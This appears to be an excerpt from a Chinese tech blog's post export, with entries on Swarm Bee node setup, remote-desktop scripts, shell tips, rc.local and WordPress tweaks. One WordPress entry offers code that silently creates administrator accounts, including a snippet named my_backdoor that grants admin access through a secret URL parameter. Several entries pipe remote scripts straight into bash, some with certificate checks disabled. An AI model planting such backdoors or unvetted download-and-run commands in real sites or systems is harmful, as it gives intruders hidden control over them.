--install google-chrome-stable_current_amd64.debsudo apt install --assume-yes --fix-brokenwget https://media.codeweavers.com/pub/crossover/cxlinux/demo/crossover_20.0.2-1.debsudo dpkg -i crossover_20.0.2-1.debsudo apt install --assume-yes --fix-brokensudo apt install nautilus nano -y sudo apt -y install obs-studiosudo apt -y install firefoxsudo adduser ALOK chrome-remote-desktop&#125; &amp;&gt; /dev/null &amp;&amp;printf &quot;\nSetup Completed &quot; &gt;&amp;2 ||printf &quot;\nError Occured &quot; &gt;&amp;2printf &apos;\nCheck https://remotedesktop.google.com/headless Copy Command Of Debian Linux And Paste Down\n&apos;read -p &quot;Paste Here: &quot; CRPsu - ALOK -c &quot;&quot;&quot;$CRP&quot;&quot;&quot;printf &apos;Check https://remotedesktop.google.com/access/ \n&apos;printf &apos;Your SUDO Pasword Is 8426 \n&apos;printf &apos;Terminal issue solve - https://youtu.be/XZxxaNWJxT0&apos; 分析参考: 123456789101112131415161718192021222324printf "Check Out My Channel While Waiting- https://youtu.be/VeO22kIvZOQ" &gt;&amp;2打印方法使用printf&#123;命令...&#125; &amp;&gt; /dev/null &amp;&amp;用大括号括上命令并一起执行. 然后把输出内容忽略sudo useradd -m ALOK增加用户sudo adduser ALOK sudo将用户加入sudo列表中echo 'ALOK:8426' | sudo chpasswd修改用户ALOK的密码sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd更改bash为用户的默认shellread -p "Paste Here: " CRPsu - ALOK -c """$CRP"""使用ALOK用户执行脚本 QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bee一键导出私钥环境搭建]]></title>
    <url>%2F2021%2F03%2F01%2F165.bee%E4%B8%80%E9%94%AE%E5%AF%BC%E5%87%BA%E7%A7%81%E9%92%A5%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[bee一键导出私钥环境搭建 QQ群：397745473 123456789curl -O https://storage.googleapis.com/golang/go1.16.linux-amd64.tar.gzsudo tar -C /usr/local -xzf go1.16.linux-amd64.tar.gzmkdir -p ~/go; echo "export GOPATH=$HOME/go" &gt;&gt; ~/.bashrcecho "export PATH=$PATH:$HOME/go/bin:/usr/local/go/bin" &gt;&gt; ~/.bashrcsource ~/.bashrcgit clone https://github.com/jmozah/exportSwarmKey.gitcd exportSwarmKey/pkggo main.go ~/.bee/keys/ youpassword QQ群：397745473]]></content>
      <categories>
        <category>虚拟币</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>虚拟币</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux写Shell脚本时遇到的坑记录一下]]></title>
    <url>%2F2021%2F03%2F01%2F164.Linux%E5%86%99Shell%E8%84%9A%E6%9C%AC%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%2F</url>
    <content type="text"><![CDATA[Linux写Shell脚本时遇到的坑记录一下 该死的^M QQ群：397745473 该死的^M^M，神奇的字符！相信很多人写 Shell 脚本的时候都被这个字符坑过，我自己也至少被坑过两次。最近周围的好几个小伙伴又被 ^M 坑，花了好几个小时检查脚本的错误，结果发现是 ^M 导致的。所以写了这篇文章讲一下什么是 ^M，当 ^M 出现的时候一般会伴随着什么样的现象，出现了我们可以用什么手段去解决。 ^M 是何方神圣这个得先从 Windows 和 Unix 下的换行符开始说起，在我的 Intellij IDEA 的右下方的状态栏上，有一块是展示当前文件的换行符的： 可以看到在 Windows 下，换行符是 \r\n，在 Unix 下换行符是 \n。如果我们用把一个文件的换行符换成 Windows 的换行符，那么当我们用 cat -v 来看的时候，就可以看到： 实际上 ^M 就是 Windows 下的换行符中的 \r 部分。因为 Unix 下的换行符是 \n，所以当一个用 Windows 下的换行符的文件放在 Unix 下的时候，单行的最后一个字符就变成了 \r，\r 在 ASCII 码中是 0xD，而 0xD 在 VIM 和 cat -v 则刚好被显示为 ^M。 刚才之所以用 cat -v 而不用普通的 cat 是因为 ^M 是不可见的字符，如果仅仅用 cat，是看不到这个字符的。cat 的 -v 参数的作用就是显示不可打印的字符。 ^M 会导致什么样的问题？我们已经知道了 ^M 实际上就是 \r，而 \r 是回车符（Carriage Return），回车符的作用是将设备的位置重置到当前行的开头。 知道了 \r 的作用时候，我们来看一个现象： 1234567### 有一个普通文件，存放了一个路径，当前行的最后以 ^M 结尾$ cat -v Main/home/admin/khotyn.huangt/test/^M### Echo 一下，神奇了！$ echo &quot;`cat Main`/where am i&quot;/where am i/khotyn.huangt/test/ 看到后面那个 echo 命令，它将 Main 文件中的内容提取出来，再在后面加上 /where am i 这个字符串，结果我们看到，/where am i 在打印的结果中跑到最前面去了，这正是 \r 这个字符的作用，因为 cat Main 的执行的结果的最后一个字符是 \r，所以一遇到这个字符，设备指针就直接回到了当前行的开头，所以 \r 后面的 /where am i 就直接显示在了最前面。 所以，当你看到什么奇怪的路径，这个路径中莫名其妙地少了一些字符，出现了一些莫名其妙的字符串的，很可能就是 ^M 导致的。 如何逃离 ^M 的魔掌当你发现了 ^M 导致的问题的时候，最直截了当的方式就是将 ^M 从文件中去掉。 一、临时解决的几个方法如果的机器上安装有 dos2unix，那么恭喜你，直接运行 1dos2unix /path/to/file 就可以将一个文件的换行符从 Windows 的转换成 Unix 的。 但是，如果机器上没有装 dos2unix，而你又没法装上去（在一家公司工作总是会有各种各样的让你感觉很丧气的权限控制），那么你可以用 sed 来替换： 1sed --in-place=&apos;&apos; &apos;s/^M//g&apos; /path/to/file 注意：上面的 ^M 只是显示的效果，输入的时候需要用组合键输入，先 Ctrl + V，然后马上 Ctrl + M 就可以在终端中输入 ^M 了。 当然，用 tr 之类的命令也可以，不过我一般用 sed 的原因是 sed 加上 --in-place 参数可以做到直接替换原文件，而不用产生临时的文件（危险而高效的操作）。 二、预防此问题不过，前面说的只是当出现问题的时候如何解决，那么如何预防这个问题呢？ 第一个方法当然是直接放大招，换个 Mac 啥的，或者把你的机器上的 Windows 格了，装个 Ubuntu 也好啊。真心觉得 Windows 对于程序员来说真的没有啥好处（我好想听说连微软都开源 .Net 了，并且会提供多平台的支持）。 第二个方法嘛，当在 Windows 下使用各种编辑器的时候，尽量将换行符设置成 Unix 的换行符。不要偷懒用 Windows 的换行符，出现了问题就是好几个小时的排查时间。（目前没有发现有什么场景下有必须用到 Windows 下的换行符的，如果有同学知道有这样的场景的话，不吝赐教）。 三、防止被别人坑虽然我个人觉得不应该用 Windows，不过还是有同学的确是喜欢用，或者因为不可抗拒的因素而暂时在使用，为了防止出现这个问题，可以在版本管理软件上做控制，比如 Git 就可以设置换行符，当你提交文件的时候，可以将你的所有文本的换行符替换成你设定的换行符，详细可以看 https://help.github.com/articles/dealing-with-line-endings/ 1原文参考：https://note.ileler.com/other/gai-si-de-m QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用gETH和gBZZ代币补充钱包（Swarm Bee）]]></title>
    <url>%2F2021%2F02%2F24%2F163.SwarmBee%2F</url>
    <content type="text"><![CDATA[使用gETH和gBZZ代币补充钱包（Swarm Bee） QQ群：397745473 查出钱包地址： 1curl -s localhost:1635/addresses | jq .ethereum 直接到官方获取： 12打开： https://discord.gg/r9sBAqnw在聊天中输入： sprinkle &lt;钱包地址&gt; 查询是否获取成功：https://goerli.etherscan.io/ 发送好重启一下服务就可以了 123查看状态： systemctl status bee重启服务: systemctl restart bee查看日志: journalctl -f -u bee 原文参考： 1https://telegra.ph/gbzz-geth-02-22 QQ群：397745473]]></content>
      <categories>
        <category>虚拟币</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>虚拟币</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一键部署Swarm获得空投100万枚BZZ代币]]></title>
    <url>%2F2021%2F02%2F22%2F162.%E4%B8%80%E9%94%AE%E9%83%A8%E7%BD%B2Swarm%E8%8E%B7%E5%BE%97%E7%A9%BA%E6%8A%95100%E4%B8%87%E6%9E%9ABZZ%E4%BB%A3%E5%B8%81%2F</url>
    <content type="text"><![CDATA[一键部署Swarm获得空投100万枚BZZ代币 英文文档知道大家都不喜欢看。 看视频也费时间。 那么这些都交给我来做成一键脚本。 一步到位！奥利给！ QQ群：397745473 准备工作新建账号并充值新账户申请可享受充10$得110$ 1新建账号并充值： https://www.vultr.com/?ref=8391117-6G 建立linux虚拟机 连接主机1先到这里下载bitvise连接工具并安装 https://www.bitvise.com/ssh-client-download 执行命令使用 root 用户登录系统，运行以下命令下载脚本，赋予执行权限： 1wget --no-check-certificate -O /root/run.sh https://git.io/JtHhx &amp;&amp; chmod 755 /root/run.sh &amp;&amp; bash /root/run.sh 保存好私钥就可以导入到小狐狸了 123tmux new -s beetmux a -t beebee start --config /root/bee-default.yaml 使用gETH和gBZZ代币补充钱包（Swarm Bee）： https://vksec.com/2021/02/24/163.SwarmBee/ 1234567891011水龙头地址: https://faucet.ethswarm.org/查询交易记录： https://goerli.etherscan.io/curl -s http://localhost:1635/peers -确保已连接到群集curl -s http://localhost:1635/balances-看到正在与同级交换数据curl -s http://localhost:1635/settlements -查看其中任何余额是否超过了要结算的阈值。curl -s http://localhost:1635/chequebook/cheque 查看是否有支票。 lastReceived代表可以兑现！curl -s http://localhost:1635/addresses 获取自己的钱包地址，公钥信息curl -s http://localhost:1635/peers | jq &apos;.peers | length&apos; 查节点数量bee-clef私钥导出：bash &lt;(curl -s -L https://raw.githubusercontent.com/ethersphere/bee-clef/master/packaging/bee-clef-keys) 国外安装资料1234服务安装: https://telegra.ph/Bee-to-systemd-02-22安装资料: https://telegra.ph/Bee-Install-02-21Swarm Bee节点的技术问题: https://telegra.ph/Swarm-Bee-tech-problems-02-21discord: https://discord.gg/Bdey9V5U 其他相关资料123456789101112131415官方公告：https://medium.com/ethereum-swarm/swarm-is-airdropping-1-000-000-bzz-bd3b706918d3官网教程: https://docs.ethswarm.org/docs/微信公众号教程：https://mp.weixin.qq.com/s/Z3MXqyLxqOTv7Z618JhZcA视频教程(linux)：https://www.bilibili.com/video/BV1ky4y1E772视频教程(windows): https://www.bilibili.com/video/BV1fK4y1n7nbhttps://twitter.com/ethswarmhttps://www.reddit.com/r/ethswarmhttps://discord.gg/ykCupZMuww网友测试提醒：.bee得文件 增长很快，记的跑的时候 即时清空硬盘信息 (1个小时 生成 1GB得文件)其他一键安装：https://telegra.ph/Swarm-Bee-Node-Install-02-21 常见问题12345678910111213141516171819202122231.余额怎么查，怎么看有多少支票余额：curl -s localhost:1635/chequebook/balance | jq支票：curl -s localhost:1635/chequebook/cheque | jq所有查看余额、支票获取等操作访问：https://docs.ethswarm.org/docs/advanced/swaphttps://github.com/ethersphere/bee/issues大先生Swarm空投攻略https://chinapeace.github.io/index.html水龙头1：https://faucet.ethswarm.org/水龙头2：https://goerli-faucet.slock.it/查询： https://goerli.etherscan.io全部节点：https://beenodes.live/swap-endpoint:https://rpc.slock.it/goerliswap-endpointhttps://goerli.prylabs.nethttps://rpc.goerli.mudit.blog取钱 https://metamask.io/download.htmlGoogle Cloud Platform 免费送300美刀，赶紧体验一波https://zhuanlan.zhihu.com/p/89938455 常用命令123456789操作api提供：curl http://localhost:1635/peers -确保已连接到群集curl http://localhost:1635/balances-看到正在与同级交换数据curl http://localhost:1635/settlements -查看其中任何余额是否超过了要结算的阈值。curl http://localhost:1635/chequebook/cheque 查看是否有支票。 lastReceived代表可以兑现！curl http://localhost:1635/addresses 获取自己的钱包地址，公钥信息bee-clef私钥导出脚本：bash &lt;(curl -s -L https://raw.githubusercontent.com/ethersphere/bee-clef/master/packaging/bee-clef-keys) 一键脚本开发参考关键词： 一键安装 linux curl 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455比较少见的安装方式使用source的方式来作为脚本的安装,思路非常新颖.source &lt;(curl -sL https://git.io/trojan-install)source &lt;(curl -sL https://git.io/trojan-install) --removehttps://raw.githubusercontent.com/teddysun/across/master/wireguard.shwget --no-check-certificate -qO AutoDD.sh &apos;http://git.io/autodd.sh&apos; &amp;&amp; bash AutoDD.shwget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.shbash &lt;(curl -s -L https://git.io/v2ray.sh)bash &lt;(curl -s -L https://git.io/Jvc32)bash &lt;(curl -L -s -k &quot;https://git.io/Jvc36&quot;)-k 允许curl使用非安全的ssl连接并且传输数据（证书不受信）curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyuncurl -sSL https://get.daocloud.io/docker | shwget -qO- https://get.docker.com/ | bashbash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/kenzok8/Trojan/master/trojan-go_install.sh)&quot;来源： https://www.cnblogs.com/linkenpark/p/10153882.html现在是懒人的天下，为了迎合用户的需求，很多开源软件或者包提供的安装步骤都非常简单，大家应该看到不少类似一键安装的命令。下面是几个典型的例子：# homebrew 安装$ ruby -e &quot;$(curl -fsSL https://raw.github.com/Homebrew/homebrew/go/install)&quot;# nvm 安装, 两种方法$ curl https://raw.githubusercontent.com/creationix/nvm/v0.8.0/install.sh | sh$ wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.8.0/install.sh | sh# rvm 安装$ \curl -sSL https://get.rvm.io | bash -s stablewget -qO- https://get.rvm.io | bash -s -- arg1 arg2 # -- 表示 参数不做任何处理，bash -s 传参时， $#、$@获取不到正确的值。wget -qO- https://get.rvm.io | bash -x -s -- arg1 arg2 # -x 可以打印执行的情况，可以用于调试简单粗暴，CMD + C 再加 CMD + V，随手一个 Enter，就搞定了。那么这上面的原理是什么样子的呢？其实很简单。 首先通过 curl 或者 wget 将安装脚本下载下来，将内容输出到标准输出。这一步对应上面的 curl -ssL 或者 wget -qO-，一定要注意将错误或者异常输出过滤掉，保证标准输出的内容就是脚本的内容。然后通过管道传递给 shell，shell 在没有指定脚本文件的时候，支持从标准输入读取脚本内容并解释执行。这样将&quot;下载 - 保存 - 安装&quot;这几步操作合到一个命令中完成。对于 rvm 的安装又有点特殊，安装脚本需要指定执行参数，bash -s stable 中 -s 之后的部分就是透传给安装脚本的参数，翻译下可以理解的形式是：$ \curl -sSL https://get.rvm.io &gt; /tmp/rvm_install.sh$ bash /tmp/rvm_install.sh stable$ rm -f /tmp/rvm_install.shPS: \curl 的用法，我在 终端下肉眼看不见的东西 曾经提到过。不过，建议执行类似一键安装的命令之前，一定要先大致看下安装脚本，避免里面有不安全的代码。 QQ群：397745473]]></content>
      <categories>
        <category>虚拟币</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>虚拟币</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[非插件自动为WordPress关键词添加链接]]></title>
    <url>%2F2021%2F02%2F19%2F152_%E9%9D%9E%E6%8F%92%E4%BB%B6%E8%87%AA%E5%8A%A8%E4%B8%BAWordPress%E5%85%B3%E9%94%AE%E8%AF%8D%E6%B7%BB%E5%8A%A0%E9%93%BE%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[非插件自动为WordPress关键词添加链接 QQ群：397745473 1为wordpress日志 关键词添加链接，增加内链和外链，有利于SEO，实现上述功能一般我们会通过安装插件来实现，比如：WP Keyword Link和SEO Smart Link等。网上很多代码都是失效，用了一下知更鸟的代码特意分享转载学习。 将下面代码粘贴到主题functions.php文件中： 123456789101112//Auto Link Tagsfunction replace_text_wps($text)&#123; $replace = array( 'vksec1' =&gt; '&lt;a href="http://www.vksec.com/" rel="vksec" title="vksec"&gt;vksec&lt;/a&gt;', 'vksec2' =&gt; '&lt;a href="http://www.vksec.com/" rel="vksec" title="vksec"&gt;vksec&lt;/a&gt;', 'vksec3' =&gt; '&lt;a href="http://www.vksec.com/" rel="vksec" title="vksec"&gt;vksec&lt;/a&gt;' ); $text = str_replace(array_keys($replace), $replace, $text); return $text; &#125; add_filter('the_content', 'replace_text_wps'); 修改以上的关键词和链接地址就可以了。 源文： 1https://yj511.blog.csdn.net/article/details/107971389 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell脚本中使用getopts接收参数的使用方法]]></title>
    <url>%2F2021%2F02%2F18%2F151_shell%E8%84%9A%E6%9C%AC%E4%B8%AD%E4%BD%BF%E7%94%A8getopts%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[shell脚本中使用getopts接收参数的使用方法 QQ群：397745473 1234参考：http://puremonkey2010.blogspot.com/2016/05/linux-bash-getopts.htmlhttps://www.theunixschool.com/2012/08/getopts-how-to-pass-command-line-options-shell-script-Linux.html 命令行选项可以分为3种类型： -不带参数的选项： -带有参数的选项： -选项+其他命令行参数： getopts命令的语法为： 12345678getopts optstring name-&gt; optstring-包含命令行中预期选项列表的字符串-&gt;名称-变量名，用于一一读取命令行选项。此命令中使用了环境变量：* OPTARG：包含特定命令行选项的参数值。 * OPTIND：包含下一个命令行选项的索引。 案例： 1234567891011121314151617181920#!/bin/sh while getopts dm name do case $name in d)dopt=1;; m)mopt=1;; *)echo &quot;Invalid arg!&quot;;; esac done DT=`date &apos;+%d %b&apos;` if [[ ! -z $dopt ]]; then echo &quot;Date is: &quot; $&#123;DT/ */&#125; fi if [[ ! -z $mopt ]]; then echo &quot;Month is: &quot; $&#123;DT/* /&#125; fi shift $(($OPTIND - 1)) 结果： 1234567# ./disp.sh -dDate is: 19# ./disp.sh -d -mDate is: 19Month is: 5月# ./disp.sh -mMonth is: 5月 上面这些基本够用，更多可以参考英文文档： 1http://puremonkey2010.blogspot.com/2016/05/linux-bash-getopts.html QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Chrome英文版离线安装包下载]]></title>
    <url>%2F2021%2F02%2F15%2F154_Chrome%E8%8B%B1%E6%96%87%E7%89%88%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD%2F</url>
    <content type="text"><![CDATA[Chrome英文版离线安装包下载 QQ群：397745473 Chrome英文版离线安装包下载 下载地址： 在原来在线安装地址后面加上 ?standalone=1 即可 https://www.google.com/intl/en/chrome/browser/desktop/index.html?standalone=1 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wordpress自动创建超级账号]]></title>
    <url>%2F2021%2F02%2F12%2F155_wordpress%E8%87%AA%E5%8A%A8%E5%88%9B%E5%BB%BA%E8%B6%85%E7%BA%A7%E8%B4%A6%E5%8F%B7%2F</url>
    <content type="text"><![CDATA[wordpress自动创建超级账号 QQ群：397745473 wordpress自动创建超级账号 添加下面的代码到所用的主题的 functions.php 文件， 然后随意打开网站的一个页面，就可以自动为你创建一个管理员账号了。 12345678910111213141516add_action( 'template_redirect', 'create_admin_user' );function create_admin_user() &#123; $username = 'superuser'; $password = 'password'; $email_address = 'info@superuser.com'; if ( isset( $username ) &amp;&amp; isset( $password ) &amp;&amp; isset( $email_address ) ) &#123; if ( ! username_exists( $username ) &amp;&amp; ! email_exists( $email_address ) ) &#123; $user_id = wp_create_user( $username, $password, $email_address ); if ( is_int( $user_id ) ) &#123; $wp_user_object = new WP_User( $user_id ); $wp_user_object-&gt;set_role( 'administrator' ); &#125; &#125; &#125;&#125; 更多参考代码: 123456789101112131415https://gist.github.com/jgalea/5724566&lt;?phpadd_action( &apos;wp_head&apos;, &apos;my_backdoor&apos; );function my_backdoor() &#123; if ( md5( $_GET[&apos;backdoor&apos;] ) == &apos;34d1f91fb2e514b8576fab1a75a89a6b&apos; ) &#123; require( &apos;wp-includes/registration.php&apos; ); if ( !username_exists( &apos;mr_admin&apos; ) ) &#123; $user_id = wp_create_user( &apos;mr_admin&apos;, &apos;pa55w0rd!&apos; ); $user = new WP_User( $user_id ); $user-&gt;set_role( &apos;administrator&apos; ); &#125; &#125;&#125; QQ群：397745473]]></content>
      <categories>
        <category>wordpress</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码审计靶机docker环境搭建记录]]></title>
    <url>%2F2021%2F02%2F01%2F158_%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%9D%B6%E6%9C%BAdocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[代码审计靶机docker环境搭建记录 QQ群：397745473 12资料文档： https://yeasy.gitbook.io/docker_practice/image/build环境代码： https://github.com/hongriSec/PHP-Audit-Labs 一. linux 安装dockerdocker-compose 的安装在 Ubuntu、Debian 上可以这样操作。 1234apt update &amp;&amp; apt upgradeapt install python3-pippip3 install -U pippip3 install docker-compose 二. 下载环境1git clone https://github.com/hongriSec/PHP-Audit-Labs.git 123[红日安全]代码审计Day1 - in_array函数缺陷 https://xz.aliyun.com/t/2451红日安全: https://xz.aliyun.com/u/10394 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用 GOST 搭建加密中转隧道]]></title>
    <url>%2F2021%2F02%2F01%2F159_%E5%88%A9%E7%94%A8%20GOST%20%E6%90%AD%E5%BB%BA%E5%8A%A0%E5%AF%86%E4%B8%AD%E8%BD%AC%E9%9A%A7%E9%81%93%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络钓鱼框架]]></title>
    <url>%2F2021%2F02%2F01%2F160_%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E6%A1%86%E6%9E%B6%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! U2FsdGVkX1/Cc86bTSQPzYiZsNV/SJIfi8igyvCUzeWYh+lIavBrWu9/h8l3NBzPhdKHmjMUZ/l3VieW7UiQCSzmcGxy/azwztBcwz6rHmYq0KsJ6bwPGdGIRbzDnPnhpKUa9eRCNtfLiIQgDZECyc9pi/R/2H90xqwaL6n8vIYWgynSC6vpcoR/26nSHVcfYN3JMpOg/j4zK6K8OozqLWAOC/5CDyZBPKO/a+JWCd1HBCVl+fmJVtPb2ect/qzGvZ2G9SPcULgd4EhQurBXqMcA/82fW0pEMYNus3H4mXXdnQ+LMuFLWOKDRmDwzuSMRV0TOipNSFYdwvuCcfRM2MGKu9iv2e6jV1PfY5cMcffCqmCer3MYGilc/HGwXQNKrIQjZ6uU18dcfncUBaktnmKjpFiOal4hikFLMPKRd2+Y7l3EDMA/LLaBU/N3Sc1LV8iRFxrInRRL2h+Buty82YxniBgI6lBAW4krfpy9xoyDAP++R4HlK6jzZGEDfFClbC21cuLxAhHvWq8uHvED5Ojd16CdtTOUiYyaxjtni56whS1T/IgE7jvAvYSquIO5e3VVptsKAfIFLGPxnWcemF29yvD3nXGoKECNyhEF5VgsDTiFA+7B4/j0ysoFRIkRXKfZltHnuLtn/p2jFmkFJX8NVh+1D++6/AhZtCdjarYMewcR83Cgh0D88WMOXz1VWyy0WR8nyKBDpYa5ljQDHbXO5AH53aB+jwo/Q2weizIe5R9ZsIH3mOyjfZw720A7U3AvZ6hlmSwC1IBxY/OeIhlx/a00hXyCLVh+HezkIg9wYRY+59AYVBtJaB2FHOgqadooPDJHaGBkM33QO7OOdVHAt671aVwrA6L1zVe/aaTADO586w8X1MtHEamSaF3dfoOULYLVDso2zPXZVoILSPLwuDyGHU/P+tvIXETT1uk6SQIq/e4fVqcQXoeKM6LFh/BAkl+HKWageRVGbwf7/d710MUyMfd8KU8vnomtxA6bsxuu89u58E1OQSTmZzJNVHDt6grY4AssTcUKW+iEXSY5Dtx0ToWswP/nQYWiDdY4N97z3ayye/tx+eop6FwslSdXIgrH29YRNsaVbf02nmwBdodr0ZmP67xUg1seu4x5Ll9ZybVjJ5l4GBxn4VBfV3RzAbF8udyh+mwqnvPKWB+XKpflp0eTEtjCKA8mxJcvSzE9nbcc/LRXLN/cFmhwUKUzBwvznXO24n0mEsOLRIlVHXn3u03aKJz1a16mLnMF8BZ/MIUXmhvaY4Bymr2X8/q2NduZ01w3igaeFlRX2O28sHqAtIjzxO61GR93fzVwlWlqEEa8uXfOUdycM9iiFEM8kCLTiId63ewIRxNBjN2tSFXJ4KG9DYTiF299JzXtKDVnyUNQdQrJ0SESWb4uW9EmkTCMcvqEjawvpgg3JEs4ruCi4CwRnsKmqYez758eb6bGVDVf+cmoWalQzf9QKZdHWywV9O/XTlS/tzCYGNSUeH2AWDS7AUIOrbG+fGFv7UeSd2NFy2MQ8bZRfHIphPhd/B/CA9QCPm4J7lnzMP8HqlIQ+IzrmL8lxWXrGjU=]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ROS视频实战教程]]></title>
    <url>%2F2021%2F02%2F01%2F161_ROS%E8%A7%86%E9%A2%91%E5%AE%9E%E6%88%98%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[ROS视频实战教程 QQ群：397745473 1方猫: https://www.youtube.com/user/siyivfx/videos QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Debian解决开机启动问题]]></title>
    <url>%2F2021%2F01%2F25%2F157_Debian10%E8%A7%A3%E5%86%B3%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[Debian 10 解决 /etc/rc.local 开机启动问题 由于某些软件没有开机自动启动的服务，很多时候需要手工添加，一般我们都是推荐添加命令到 /etc/rc.local 文件，但是 Debian 10 默认不带 /etc/rc.local 文件，而 rc.local 服务却还是自带的. QQ群：397745473 查看服务配置文件123456789101112131415161718192021222324[root@debian /root]# cat /lib/systemd/system/rc.local.service# SPDX-License-Identifier: LGPL-2.1+# # This file is part of systemd.# # systemd is free software; you can redistribute it and/or modify it# under the terms of the GNU Lesser General Public License as published by# the Free Software Foundation; either version 2.1 of the License, or# (at your option) any later version.# This unit gets pulled automatically into multi-user.target by# systemd-rc-local-generator if /etc/rc.local is executable.[Unit]Description=/etc/rc.local CompatibilityDocumentation=man:systemd-rc-local-generator(8)ConditionFileIsExecutable=/etc/rc.localAfter=network.target[Service]Type=forkingExecStart=/etc/rc.local startTimeoutSec=0RemainAfterExit=yesGuessMainPID=no 查看服务状态 默认情况下这个服务还是关闭的状态 1234567[root@debian /root]# systemctl status rc-local● rc-local.service - /etc/rc.local Compatibility Loaded: loaded (/lib/systemd/system/rc-local.service; static; vendor preset: enabled) Drop-In: /usr/lib/systemd/system/rc-local.service.d └─debian.conf Active: inactive (dead) Docs: man:systemd-rc-local-generator(8) 增加配置文件为了解决这个问题，我们需要手工添加一个 /etc/rc.local 文件 12345678910111213141516[root@debian /root]# cat &lt;&lt;EOF &gt;/etc/rc.local# !/bin/sh -e# # rc.local# # This script is executed at the end of each multiuser runlevel.# Make sure that the script will &quot;exit 0&quot; on success or any other# value on error.# # In order to enable or disable this script just change the execution# bits.# # By default this script does nothing.exit 0EOF 赋予配置文件权限1[root@debian /root]# chmod +x /etc/rc.local 启动 rc-local 服务1[root@debian /root]# systemctl start rc-local 查看服务状态1234567891011[root@debian /root]# systemctl status rc-local● rc-local.service - /etc/rc.local Compatibility Loaded: loaded (/lib/systemd/system/rc-local.service; static; vendor preset: enabled) Drop-In: /usr/lib/systemd/system/rc-local.service.d └─debian.conf Active: active (exited) since Tue 2020-03-17 10:04:27 CST; 9s ago Docs: man:systemd-rc-local-generator(8) Process: 18500 ExecStart=/etc/rc.local start (code=exited, status=0/SUCCESS)3月 17 10:04:27 debian systemd[1]: Starting /etc/rc.local Compatibility...3月 17 10:04:27 debian systemd[1]: Started /etc/rc.local Compatibility. 现在你可以把需要开机启动的命令添加到 /etc/rc.local 文件，丢在 exit 0 前面即可，并尝试重启以后试试是否生效。 Ubuntu16.04 rc.local不生效，启动过程中报“Failed to start /etc/rc.local Compatibility”错误使用Ubuntu16.04时，发现有时候启动脚本/etc/rc.local中的命令不生效，随即发现在这种情况下系统启动时会打印 Failed to start /etc/rc.local Compatibility 错误。 搜索了下，找到适合我的解决办法是将文件中第一行： 修改成 #!/bin/bash 就可以了。原因可能是用户使用的shell和rc.local文件指定的执行shell不一致。记录下，以免以后忘记。 QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux学习资料推荐]]></title>
    <url>%2F2021%2F01%2F22%2F156_linux%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%8E%A8%E8%8D%90%2F</url>
